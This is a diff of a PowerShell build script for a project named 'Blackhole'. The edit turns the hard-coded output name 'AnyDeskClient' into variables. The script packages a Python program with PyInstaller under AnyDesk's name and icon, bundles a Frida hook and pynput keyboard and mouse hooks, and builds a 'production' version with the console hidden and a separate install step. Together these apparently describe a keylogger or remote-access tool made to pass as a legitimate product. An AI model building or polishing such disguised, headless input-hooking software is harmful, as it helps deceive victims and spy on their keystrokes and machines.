@@ -1,6 +1,10 @@
 # Blackhole Build Script
 param([switch]$Dev)
 
+# Configuration variables
+$ExeName = "AnyDeskClient.exe"
+$ExeBaseName = "AnyDeskClient"  # Name without .exe extension (for PyInstaller --name)
+
 Write-Host ""
 Write-Host "========================================"
 Write-Host "  Blackhole - Build"
@@ -59,7 +63,8 @@ Write-Host ""
 Write-Host "Cleaning previous builds..."
 if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
 if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
-if (Test-Path "AnyDeskClient.spec") { Remove-Item -Force "AnyDeskClient.spec" }
+$specFile = "$ExeBaseName.spec"
+if (Test-Path $specFile) { Remove-Item -Force $specFile }
 Write-Host "Build directories cleaned"
 Write-Host ""
 
@@ -67,7 +72,7 @@ Write-Host ""
 if ($Dev) {
     Write-Host "Building DEV mode with console"
     Write-Host ""
-    & $venvPython -m PyInstaller --onefile --console --name AnyDeskClient --icon AnyDesk.ico --add-data "utils/frida_hook.js;utils" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
+    & $venvPython -m PyInstaller --onefile --console --name $ExeBaseName --icon AnyDesk.ico --add-data "utils/frida_hook.js;utils" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host ""
@@ -86,7 +91,7 @@ if ($Dev) {
     Write-Host "  Build Complete - DEV MODE"
     Write-Host "========================================"
     Write-Host ""
-    Write-Host "Output: dist\AnyDeskClient.exe"
+    Write-Host "Output: dist\$ExeName"
     Write-Host "Marker: dist\.dev_mode"
     Write-Host "Console: VISIBLE"
     Write-Host ""
@@ -95,7 +100,7 @@ if ($Dev) {
 } else {
     Write-Host "Building PRODUCTION mode headless"
     Write-Host ""
-    & $venvPython -m PyInstaller --onefile --noconsole --name AnyDeskClient --icon AnyDesk.ico --add-data "utils/frida_hook.js;utils" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
+    & $venvPython -m PyInstaller --onefile --noconsole --name $ExeBaseName --icon AnyDesk.ico --add-data "utils/frida_hook.js;utils" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host ""
@@ -115,7 +120,7 @@ if ($Dev) {
     Write-Host "  Build Complete - PRODUCTION"
     Write-Host "========================================"
     Write-Host ""
-    Write-Host "Output: dist\AnyDeskClient.exe"
+    Write-Host "Output: dist\$ExeName"
     Write-Host "Console: HIDDEN"
     Write-Host ""
     Write-Host "Install: .\install.ps1"
